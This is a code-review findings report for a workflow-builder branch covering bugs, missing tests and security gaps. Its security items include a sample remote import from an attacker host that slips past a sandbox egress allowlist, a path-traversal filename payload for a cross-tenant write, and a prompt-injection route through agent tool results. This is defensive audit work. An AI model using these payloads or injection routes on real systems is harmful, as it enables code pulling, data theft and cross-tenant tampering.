# Visual Workflow Builder: Stacked-PR Review Findings

Confirmed issues from a per-PR review of `feature/visual-workflow-builder` (split plan in [STACKED_PR_SPLIT_PLAN.md](STACKED_PR_SPLIT_PLAN.md)). Every item below was independently double-checked against the current working tree; runtime-proven items are marked **(proven)**. Excludes anything already documented in the phase design docs or already fixed by the `pX-` review commits. Severity tags: 🔴 Critical · 🟠 High · 🟡 Medium · ⚪ Low.

---

## Cross-PR integration (won't surface when each PR is reviewed alone)

### 1. [x] 🔴 Agent writes bypass the auto-wire resolver (PR 7 ↔ auto-wire)
**Area:** Backend — `agent/tools.ts` vs Frontend — `WorkflowEditorV2Page.tsx`
**Problem:** `resolveBindings` / `normaliseLocks` / `stripRedundantLocks` run **only** in the frontend editor page (invoked at `WorkflowEditorV2Page.tsx:174,273,346,583,635`). The agent's `writeWorkflow`/`addNode`/`connectNodes` persist raw config via `workflowService.updateWorkflow` (`tools.ts:107-113`) and never call them (grep of `apps/backend-services/src/` for those functions = none). So agent-built workflows get no auto-wiring, and the agent's hand-authored non-`__auto.` keys are later read as **user-locked** ports when a human opens the same workflow — silently suppressing future auto-wire.
**Expected:** Route agent config writes through the same resolver/lock-normalisation path as the editor (extract a shared server-callable step), so both writers produce identical binding/lock metadata.
**Key file:** `apps/backend-services/src/agent/tools.ts:107-113`; `packages/graph-workflow/src/auto-wire/{resolver,normalise-locks,strip-redundant-locks}.ts`

### 2. [x] 🟡 Upload-and-Try drops the caller `x-api-key` (PR 5 ↔ PR 6 dyn.run)
**Area:** Backend — `workflow.controller.ts`
**Problem:** The upload path calls `startGraphWorkflow(undefined, wf.workflowVersionId, initialCtx, wf.groupId)` — 4 args, no key (`:637-642`). `startRun` forwards the caller key as the 6th arg (`:468-483`). So a workflow containing a `dyn.run` node behaves differently depending on trigger: callbacks needing `AI_DI_API_KEY` work via `/runs` but silently fail via upload-and-Try.
**Expected:** Forward the caller's `x-api-key` to `startGraphWorkflow` on the upload path too (mirror `startRun`).
**Key file:** `apps/backend-services/src/workflow/workflow.controller.ts:637-642`

---

## PR 6 — Dynamic nodes + Deno sandbox 🔒 (security-sensitive)

### 3. [x] 🔴 Remote module imports bypass the `--allow-net` egress allowlist
**Area:** Deno runner — `execute.ts`, `check.ts`, `subprocess-harness.ts`
**Problem:** Neither `deno run` (`execute.ts:106-113`) nor `deno check` (`check.ts:145`) passes `--no-remote` / `--cached-only` / an import map. Deno fetches **static** remote imports during module-graph build, which is *not* gated by runtime `--allow-net`. The harness only rewrites the `export default` token — it never strips imports (`subprocess-harness.ts:29-34`) — so a user script's `import x from "https://attacker.com/x.ts"` is fetched at both publish and run time. This is an egress / arbitrary-code-pull channel that defeats the central control the §5.4 risk-acceptance relies on. Locally there's no egress policy at all; in OpenShift only the NetworkPolicy stands in the way (see #6).
**Expected:** Pass `--no-remote` (or a strict import-map / `--cached-only` allowlist) on both `check` and `run`; reject or vet remote imports at publish time.
**Key file:** `apps/deno-runner/src/execute.ts:106-113`, `apps/deno-runner/src/check.ts:145`

### 4. [x] 🔴 Caller `x-api-key` persisted in Temporal event history
**Area:** Backend / Temporal — `workflow.controller.ts` → `graph-runner.ts` → `node-executors.ts`
**Problem:** The raw `x-api-key` is forwarded into `startGraphWorkflow` (`workflow.controller.ts:468-483`) → `state.apiKey` (`graph-runner.ts:50`, `execution-state.ts:60`) → `dyn.run` activity input (`node-executors.ts:479-487`, `dyn-run.types.ts:44`). Temporal records workflow **and** activity inputs in durable history, and no `dataConverter`/`PayloadCodec` is configured (`worker.ts:62-119`, `temporal-client.service.ts:207-217`). The group-scoped credential therefore sits in cleartext in event history (Temporal Web UI/API) for the retention period — broader than the §5.4 accepted risk ("key passed into the sandbox").
**Expected:** Encrypt the key with a Temporal PayloadCodec (or pass a short-lived/scoped token instead of the raw key, or fetch it activity-side rather than threading it through workflow input).
**Key file:** `apps/backend-services/src/workflow/workflow.controller.ts:468-483`; `apps/temporal/src/worker.ts:62-119`

### 5. [x] 🟠 No sandbox-escape negative tests
**Area:** Temporal — `dyn-run.activity.integration.test.ts`
**Problem:** The integration suite covers happy path, timeout, stdout-overflow, runtime error, invalid JSON, missing port, runner-unreachable, and env-denial (Scenario 6) — but nothing asserts `Deno.readTextFile`/`writeTextFile`/`Command`/`dlopen` are denied, or that a non-allowlisted `fetch`/remote import fails. The permission flag-list is the entire security control; a future `--allow-read`-for-convenience regression would ship green.
**Expected:** Add negative tests proving read/write/run/ffi denial and net/remote-import denial for a non-allowlisted host.
**Key file:** `apps/temporal/src/dynamic-nodes/dyn-run.activity.integration.test.ts`

### 6. [x] 🟡 Egress NetworkPolicy allows DNS (`:53`) to any destination
**Area:** Deploy — OpenShift NetworkPolicy
**Problem:** `networkpolicy.yml:39-43` permits UDP/TCP 53 with no `to:` selector (the file's own comment flags it: "tighten to the openshift-dns namespace"). Combined with #3, DNS is a viable exfil channel for the injected key / ctx even when `DYNAMIC_NODE_ALLOW_NET` is empty — undermining the "empty allowlist ⇒ platform-only" claim.
**Expected:** Restrict the DNS egress rule to the cluster DNS namespace/pods.
**Key file:** `deployments/openshift/kustomize/base/deno-runner/networkpolicy.yml:39-43`

### 7. [x] ⚪ Local docker-compose runner has no egress restriction
**Area:** Deploy — local compose
**Problem:** `docker-compose.deno.yml` defines no `internal` network or egress controls; the local sidecar has unrestricted outbound access. The §5.4 risk-acceptance assumes egress containment that exists only in OpenShift, so devs running real group keys locally get a fully-open sandbox.
**Expected:** Document the gap, or add an internal network / egress proxy for local runs.
**Key file:** `deployments/local/docker-compose.deno.yml`

> Verified sound (no action): subprocess gets only intersected `--allow-net`, the four `AI_DI_*` `--allow-env` vars, `--no-prompt`, a heap cap, and **no** `--allow-read/write/run/ffi/sys` (`execute.ts:99-113`); `computeAllowNet` is fail-closed (`dyn-run.activity.ts:215-230`).

---

## PR 5 — Document sources / upload endpoint

### 8. [x] 🔴 Path traversal via `file.originalname` (proven)
**Area:** Backend — `source-upload.service.ts`
**Problem:** The blob key is `` `${randomUUID()}-${file.originalname}` `` passed to `buildBlobFilePath` (which uses `path.posix.join`), with no sanitisation and `validateBlobFilePath` never called (`:90-96`). Proven: `originalname = "x/../../../../../../attackergroup/ocr/pwned.pdf"` resolves to a key **outside** the victim group's prefix → cross-tenant blob write/overwrite. The UUID prefix becomes a throwaway dir segment and the `..` chain escapes it.
**Expected:** Sanitise `originalname` (strip path separators / basename only) and run the result through `validateBlobFilePath` before writing.
**Key file:** `apps/backend-services/src/workflow/source-upload.service.ts:90-96`

### 9. [x] 🟠 No Multer `fileSize` limit — size check runs post-buffering
**Area:** Backend — `workflow.controller.ts`
**Problem:** `@UseInterceptors(FileInterceptor("file"))` has no `limits` (`:499`); `assertSizeWithinLimit` only fires after Multer has buffered the whole file into memory (`source-upload.service.ts:84,115-126`). So `maxFileSizeMB` gives false protection — a large body exhausts memory before rejection. The sibling `dataset.controller.ts:219-224` sets `limits.fileSize` correctly.
**Expected:** Set `limits.fileSize` on the interceptor so oversized uploads are rejected at the transport layer.
**Key file:** `apps/backend-services/src/workflow/workflow.controller.ts:499`

### 10. [x] 🟠 No authorization test on the upload endpoint
**Area:** Backend — `workflow.controller.spec.ts`
**Problem:** The `uploadToSource` describe block (`:1427-1855`) has happy/404/subtype/MIME/413/upload-and-Try cases but **no** "non-member → Forbidden" test, unlike every sibling endpoint (e.g. `startRun` spec:987). The `identityCanAccessGroup(...MEMBER)` guard at controller `:581` is real but untested — a regression dropping it ships green.
**Expected:** Add a non-member → `ForbiddenException` test for the upload endpoint.
**Key file:** `apps/backend-services/src/workflow/workflow.controller.spec.ts:1427`

### 11. [x] 🟡 Client-supplied MIME is trusted (no content sniffing)
**Area:** Backend — `source-upload.service.ts`
**Problem:** `assertMimeAllowed` validates `file.mimetype` (the attacker-controlled multipart `Content-Type`) via string/glob matching only — no magic-byte sniffing (`:107-146`). An executable labelled `application/pdf` passes the allowlist into shared blob storage.
**Expected:** Sniff content (magic bytes) against the declared/allowed types, or document the allowlist as advisory only.
**Key file:** `apps/backend-services/src/workflow/source-upload.service.ts:107-146`

### 12. [x] 🟡 Generic uploads hardcoded to `OperationCategory.OCR`
**Area:** Backend — `source-upload.service.ts`
**Problem:** All `source.upload` files are written under the OCR storage category (`:91-93`), regardless of workload. Couples a generic, arbitrary-workload feature to an OCR-specific namespace (against the no-document-specific mandate in CLAUDE.md) and misleads non-OCR workloads.
**Expected:** Use a workflow/source-generic storage category for uploaded source files.
**Key file:** `apps/backend-services/src/workflow/source-upload.service.ts:91-93`

---

## PR 4 — Try-in-place + caching

### 13. [x] 🔴 Cache stores the wrong subtree for namespaced output ctx keys
**Area:** Temporal — `node-executors.ts`
**Problem:** `collectOutputTopLevelKeys` derives the cached root via raw `binding.ctxKey.split(".")[0]` (`:220`, comment admits "we don't expand namespace prefixes here"), but `writeToCtx` first runs `applyCtxNamespace` remapping `doc.* → documentMetadata.*` / `segment.* → currentSegment.*` (`context-utils.ts:32-38`). So a `doc.*`/`segment.*` **output** snapshots `ctx["doc"]` (= undefined); on a cache **hit** nothing is restored → silent data loss. The correct helper `getCtxRootKey` exists but isn't used.
**Expected:** Use `getCtxRootKey(binding.ctxKey)` (namespace-aware) when computing the cached subtree root.
**Key file:** `apps/temporal/src/graph-engine/node-executors.ts:220`

### 14. [x] 🔴 Cache input-hash ignores namespaced input bindings → false hits
**Area:** graph-workflow — `compute-input-hash.ts`
**Problem:** Hash reads `ctx[binding.ctxKey]` with the raw key (`:105`), but execution resolves `doc.field → ctx.documentMetadata.field` via `resolvePortBinding`/`applyCtxNamespace`. For `doc.*`/`segment.*` inputs the lookup misses and emits the `null` sentinel regardless of the real value, so two runs with different `doc.*` inputs hash identically → stale/wrong cached output served.
**Expected:** Resolve bindings through the same namespace logic before hashing (reuse `resolvePortBinding`/`getCtxRootKey`).
**Key file:** `packages/graph-workflow/src/cache/compute-input-hash.ts:105`

### 15. [x] 🟠 Node-status polling never stops on early run failure
**Area:** Frontend — `useNodeStatuses.ts`
**Problem:** `isMapTerminal({})` returns `false` by design (`:136`), and the status query registers before validation/the `document.updateStatus` prehook (`graph-workflow.ts:151` vs `166-200`). A run that fails before any node executes leaves the status map empty → the canvas polls `/node-statuses` every 1.5s **indefinitely**; there's no stop-on-error or max-duration branch (`:181-189`).
**Expected:** Also stop polling on `query.state.error` or when the overall run is closed/terminal.
**Key file:** `apps/frontend/src/features/workflow-builder/run/useNodeStatuses.ts:136,181`

### 16. [x] 🟡 `versionRunCountCache` is unbounded but labelled "LRU"
**Area:** Backend — `workflow.controller.ts`
**Problem:** Comments call it "LRU-with-TTL" (`:111,151`) but the code only does `get`/`set` with a read-time TTL check (`:348,357`) — no `delete`, no size cap. It grows unbounded by distinct `workflowId::versionId` for the controller's lifetime.
**Expected:** Add real LRU eviction / size cap, or prune expired entries on write (and fix the misleading comment).
**Key file:** `apps/backend-services/src/workflow/workflow.controller.ts:157,346-358`

### 17. [x] 🟡 Run-history first page fans out unbounded `fetchHistory` RPCs
**Area:** Backend — `workflow.controller.ts`
**Problem:** `buildInputCtxSummariesForExecutions` does `Promise.all` over up to `LIST_RUNS_MAX_LIMIT` (200) executions, each issuing a full `fetchHistory()` (`:1109` → `temporal-client.service.ts:563`). The comment claims concurrency is "bounded by Temporal's gRPC pool," but `Promise.all` fires all at once — a 200-row page = 200 concurrent history fetches.
**Expected:** Bound concurrency (batch / p-limit) or lower the enrichment cap.
**Key file:** `apps/backend-services/src/workflow/workflow.controller.ts:1109`

---

## PR 3 — Typed I/O artifacts

### 18. [x] 🔴 Nested arrays defeat cardinality checking (proven)
**Area:** graph-workflow — `subtype-check.ts`
**Problem:** `parseKind` strips only the outer `[]` (`:68`), so `isAssignable("Document[][]", "Document[]")` returns **true** (proven against `dist`) — a `T[][]` producer wrongly assigns into a `T[]` consumer. `KindRef` can't express `T[][]` at compile time, but the validator consumes raw JSON `string` kinds (reachable from saved/AI/dynamic configs), so it's live. No `[][]` test exists.
**Expected:** Recursively compare array nesting depth; reject mismatched cardinality.
**Key file:** `packages/graph-workflow/src/types/subtype-check.ts:68`

### 19. [x] 🔴 Unknown/typo'd kind strings fail OPEN (proven)
**Area:** graph-workflow — `subtype-check.ts`
**Problem:** Any kind absent from the registry is treated as a wildcard in **both** directions (`:94,97`), so `isAssignable("Docment","Segment")` and `isAssignable("Document","Segmnt")` both return **true** (proven). A one-character typo in a `kind` annotation silently disables type checking on that port — the exact "no silent fallback" failure §8 forbids. `isAssignable` takes `string`, and `source.api` field kinds are user/JSON-authored (`validator.ts:1297`, `source-types.ts:77-78`), so it's reachable. No test asserts a malformed-but-nonempty kind is rejected, and nothing validates that declared kinds resolve in the registry.
**Expected:** Distinguish "intentionally untyped" (e.g. `Artifact`/wildcard) from "unrecognised kind"; reject (or at least warn on) kinds that don't resolve in the registry.
**Key file:** `packages/graph-workflow/src/types/subtype-check.ts:94,97`

### 20. [x] 🟠 Variable picker omits source-node producers (diverges from backend)
**Area:** Frontend — `resolve-producer-kind.ts`
**Problem:** `resolveCatalogProducerKind` scans only `activity`/`pollUntil` outputs (`:57`, no `source` branch), but the backend validator synthesises producers for `source.upload` (`outputKind`) and `source.api` (per-field `kind`) via `enumerateSourceProducers` (`validator.ts:1280-1404`). So a port reading a source-produced ctx key shows as "compatible" in the picker, then fails save-time validation — the primary discovery surface lies.
**Expected:** Enumerate source-node producers in the frontend resolver to match the backend precedence walk.
**Key file:** `apps/frontend/src/features/workflow-builder/graph-widgets/resolve-producer-kind.ts:57`

### 21. [x] 🟡 `library-compat` checks only `inputs[0]` and ignores `required`
**Area:** Frontend — `library-compat.ts`
**Problem:** Gates only `inputs[0]?.kind` and never filters by `required` (`:36-37`), contradicting its own docstring ("every required input's kind is assignable", `:5-6`). A library whose first input is compatible but whose second required input isn't is shown as "Compatible."
**Expected:** Check assignability for every `required` input (or update the docstring to match a deliberate first-input-only rule + add a test).
**Key file:** `apps/frontend/src/features/workflow-builder/library/library-compat.ts:36-37`

---

## PR 7 — AI agent + auto-wire

### 22. [x] 🔴 System prompt commands a non-existent `listSourceCatalog` tool
**Area:** Backend — `agent/system-prompt.ts`
**Problem:** The catalog-first rule tells the agent to call `listActivityCatalog` and `listSourceCatalog` (`:12`), but `tools.ts` registers 18 tools and none is `listSourceCatalog` (repo-wide it appears only in the prompt). Every conversation attempts an unknown tool call on turn one, wasting a step and polluting context; the agent can't discover source-node types as instructed.
**Expected:** Implement the `listSourceCatalog` tool (backed by `SOURCE_CATALOG`) or remove it from the prompt.
**Key file:** `apps/backend-services/src/agent/system-prompt.ts:12`; `apps/backend-services/src/agent/tools.ts`

### 23. [x] 🔴 Conversation resume discards all tool-call history
**Area:** Backend — `agent/agent.service.ts`
**Problem:** Assistant turns are persisted as `{ text, finishReason, usage }` only (`:167-177`); `storedRowToUIMessage` rebuilds them as a single text part (`:289-294`). On resume (`startChat:92-104`) the model sees prior assistant turns with every `tool-call`/`tool-result` part stripped — for a multi-step tool agent, resumed sessions lose the record of what was already built/run and re-reason or repeat calls.
**Expected:** Persist and rehydrate full assistant `parts` (including tool-call/tool-result), not just text.
**Key file:** `apps/backend-services/src/agent/agent.service.ts:167-177,289-294`

### 24. [x] 🟠 Abort-registry race makes a resent turn un-abortable
**Area:** Backend — `agent/abort-flag-map.ts`, `agent.service.ts`
**Problem:** `register()` aborts+replaces any existing controller (`abort-flag-map.ts:14-22`); the previous turn's `.finally(() => abortFlags.clear(conversationId))` (`agent.service.ts:193-195`) deletes whatever controller is currently mapped. If turn 2 re-registers before turn 1 settles, turn 1's `finally` clears turn 2's controller, so `POST /abort` for turn 2 no-ops.
**Expected:** Scope cleanup to the specific controller (e.g. only clear if the mapped controller is still this turn's), not by conversationId alone.
**Key file:** `apps/backend-services/src/agent/abort-flag-map.ts:14-22`; `apps/backend-services/src/agent/agent.service.ts:193-195`

### 25. [x] 🟠 `startChat` / `tools.ts` orchestration is untested
**Area:** Backend — `agent/agent.service.spec.ts`, `tools.ts`
**Problem:** `agent.service.spec.ts` covers only the 3 query methods and explicitly puts `startChat` out of scope; `tools.ts` (18 tools incl. write/validate/republish-on-409 logic) has no spec at all. Commit 89d91c1d justified the SWC transform + jest-worker cap as "lets the agent be unit-tested," but those tests were never written — the highest-churn, highest-risk file is the least covered (against CLAUDE.md's test mandate).
**Expected:** Add unit coverage for `startChat` (hydration/resume, abort cleanup, `onFinish` persistence, ctx-binding) and for the `tools.ts` write/validation/retry paths.
**Key file:** `apps/backend-services/src/agent/agent.service.spec.ts`; `apps/backend-services/src/agent/tools.ts`

### 26. [x] 🟠 No aggregate cost ceiling; unbounded tool output into context
**Area:** Backend — `agent/agent.env.ts`, `tools.ts`
**Problem:** Only per-turn `maxSteps` (30) and `maxOutputTokens` (4096) are bounded (`agent.env.ts:46-49`); there's no per-conversation/per-day token, call, or cost budget — `onFinish` records usage but nothing enforces a cumulative ceiling. Plus `getPreviewCache`/`getWorkflow`/`getNodeStatuses` return full payloads (incl. large document/OCR text) untruncated into context across up to 30 steps.
**Expected:** Enforce a per-conversation token/call budget and truncate large tool results before injecting into context.
**Key file:** `apps/backend-services/src/agent/agent.env.ts:46-49`; `apps/backend-services/src/agent/tools.ts`

### 27. [x] 🟡 Prompt-injection surface from tool results is unmitigated
**Area:** Backend — `agent/tools.ts`, `system-prompt.ts`
**Problem:** `getPreviewCache`/`getWorkflow` feed user-uploaded document content, workflow names/descriptions, and node params back into the model with no delimiting or instruction-isolation, and the system prompt has no "treat tool output as data, not instructions" guard. The agent holds write + `publishDynamicNode` + `startRun` capability, so injected instructions in document/preview content can drive real side effects.
**Expected:** Isolate/delimit tool-result content and add an explicit "tool output is data" guard to the system prompt.
**Key file:** `apps/backend-services/src/agent/tools.ts`; `apps/backend-services/src/agent/system-prompt.ts`

---

## PR 1 — Canvas foundation

### 28. [x] 🟠 Node deletion doesn't prune group membership → invalid graph
**Area:** Frontend — `WorkflowEditorCanvas.tsx`, `WorkflowEditorV2Page.tsx`
**Problem:** Both delete paths (`handleNodesDelete` `WorkflowEditorCanvas.tsx:1650-1672`; `deleteSelected` `WorkflowEditorV2Page.tsx:558-578`) remove the node + edges but never strip the id from `nodeGroups[*].nodeIds`. The validator then emits a blocking `severity:"error"` ("references non-existent node", `validator.ts:1046-1050`), so a previously-valid graph can't be saved clean after a normal delete. The settings member-removal path (`GroupNodeSettings.tsx:183-219`) *does* prune — the delete paths just don't.
**Expected:** On node delete, prune the id from all `nodeGroups[*].nodeIds` (and drop now-empty groups + orphaned `exposedParams`), matching the settings path.
**Key file:** `apps/frontend/src/features/workflow-builder/canvas/WorkflowEditorCanvas.tsx:1650`

### 29. [x] ⚪ Node ids generated from `Date.now()` with no random suffix
**Area:** Frontend — `WorkflowEditorCanvas.tsx`
**Problem:** New node ids are `` `activity_${Date.now().toString(36)}` `` / `` `${controlFlowType}_${Date.now()...}` `` (`:1894,1921`) with no random suffix — two adds in the same millisecond (fast clicks in the hover-extend picker) collide and overwrite in the id-keyed `config.nodes` map. (Edge ids in the same file already add `Math.random()`, so this is an inconsistency.)
**Expected:** Append a random suffix to node ids, as the edge-id generators already do.
**Key file:** `apps/frontend/src/features/workflow-builder/canvas/WorkflowEditorCanvas.tsx:1894,1921`

### 30. [x] ⚪ Old editor not deleted (plan-vs-reality mismatch)
**Area:** Frontend — legacy editor pages
**Problem:** The split plan says PR 1 "deletes the old editor," but `WorkflowEditorPage.tsx` (685 lines), `GraphConfigFormEditor.tsx` (922), `WorkflowPage.tsx` (665), and `WorkflowEditPage.tsx` (739) all still exist as full implementations. Downstream stacked PRs may assume the deletion already happened.
**Expected:** Either delete the legacy editor as planned or update the split plan to reflect that it stays.
**Key file:** `apps/frontend/src/pages/WorkflowEditorPage.tsx`, `apps/frontend/src/components/workflow/GraphConfigFormEditor.tsx`

---

## PR 2 — Library workflows + workflow-as-API + versioning

### 31. [x] 🟡 Pinned-version node shows the HEAD signature, not the pinned one
**Area:** Frontend — `ChildWorkflowNodeSettings.tsx`
**Problem:** `LibraryRefBody` derives the port/signature summary from `useWorkflow(workflowId)` (`:408-413`), which fetches the lineage **head** (`workflow.service.ts:359`). A node pinned to v2 shows a "v2" badge but lists head's `inputs[]/outputs[]`; the engine runs v2 correctly, so only the author-facing contract is wrong. (`useWorkflowVersion` exists but is keyed by version *id* while the node pins a version *number* — not a drop-in.)
**Expected:** Fetch and display the pinned version's config (resolve version-number → version-id) when a version is pinned.
**Key file:** `apps/frontend/src/features/workflow-builder/settings/control-flow/ChildWorkflowNodeSettings.tsx:408-413`

### 32. [x] 🟡 Library run-spec input keys use raw `path` strings → un-satisfiable
**Area:** Backend — `derive-input-schema.ts`, `validate-run-input.ts`
**Problem:** `deriveFromLibraryInputs` uses `input.path` verbatim as the JSON-Schema property key **and** pushes it into `required[]` (`:164-176`); `validateRunInput` then checks `path in initialCtx` (a literal top-level key check). The port editor is free-text and guides authors to enter ctx-prefixed paths ("e.g. ctx.documentUrl", `LibraryPortListEditor.tsx:134-143`). So a library declaring `path: "ctx.documentUrl"` makes `POST /:id/runs` require a literal key `"ctx.documentUrl"` that no graph read can ever match.
**Expected:** Define the run-input contract on the leaf key (or document the path→key derivation and validate accordingly), so required keys match what the graph body reads.
**Key file:** `apps/backend-services/src/workflow/derive-input-schema.ts:164-176`

### 33. [x] ⚪ Compare-to-head head column shows the lineage creation date
**Area:** Frontend — `CompareToHeadModal.tsx`
**Problem:** Renders `head (v{n} — {headWorkflow.createdAt})` (`:96`), but `createdAt` maps from `lineage.created_at` (`workflow.service.ts:199`), not the head version's timestamp — so head can appear "older" than a later version.
**Expected:** Show the head **version's** `created_at` in the head column.
**Key file:** `apps/frontend/src/features/workflow-builder/versioning/CompareToHeadModal.tsx:96`

### 34. [x] ⚪ `getWorkflowGraphConfig` uses `findFirst` on a unique pair
**Area:** Temporal — `get-workflow-graph-config.ts`
**Problem:** Queries `findFirst({ where: { lineage_id, version_number } })` (`:22-28`) where `(lineage_id, version_number)` has a `@@unique` constraint (`schema.prisma:195`). Functionally correct but `findUnique` (compound key) expresses intent and uses the constraint index directly.
**Expected:** Use `findUnique` with the `lineage_id_version_number` compound key.
**Key file:** `apps/temporal/src/activities/get-workflow-graph-config.ts:22-28`

---

## Key Files Reference

| Area | Files |
|------|-------|
| Deno sandbox | `apps/deno-runner/src/{execute,check,subprocess-harness}.ts`; `apps/temporal/src/dynamic-nodes/dyn-run.activity*.ts`; `deployments/openshift/kustomize/base/deno-runner/networkpolicy.yml`; `deployments/local/docker-compose.deno.yml` |
| Upload / sources | `apps/backend-services/src/workflow/source-upload.service.ts`; `apps/backend-services/src/workflow/workflow.controller.ts` (+ `.spec.ts`); `packages/blob-storage-paths/src/storage-path-builder.ts` |
| Caching / Try-in-place | `apps/temporal/src/graph-engine/node-executors.ts`; `packages/graph-workflow/src/cache/compute-input-hash.ts`; `packages/graph-workflow/src/validator/context-utils.ts`; `apps/frontend/src/features/workflow-builder/run/useNodeStatuses.ts` |
| Typed I/O | `packages/graph-workflow/src/types/subtype-check.ts`; `packages/graph-workflow/src/validator/validator.ts`; `apps/frontend/src/features/workflow-builder/graph-widgets/resolve-producer-kind.ts`; `apps/frontend/src/features/workflow-builder/library/library-compat.ts` |
| AI agent / auto-wire | `apps/backend-services/src/agent/{system-prompt,tools,agent.service,abort-flag-map,agent.env}.ts` (+ specs); `apps/backend-services/src/workflow/workflow.controller.ts`; `packages/graph-workflow/src/auto-wire/*`; `apps/frontend/src/features/workflow-builder/WorkflowEditorV2Page.tsx` |
| Canvas / library / versioning | `apps/frontend/src/features/workflow-builder/canvas/WorkflowEditorCanvas.tsx`; `.../settings/control-flow/ChildWorkflowNodeSettings.tsx`; `.../versioning/CompareToHeadModal.tsx`; `apps/backend-services/src/workflow/{derive-input-schema,validate-run-input}.ts`; `apps/temporal/src/activities/get-workflow-graph-config.ts` |
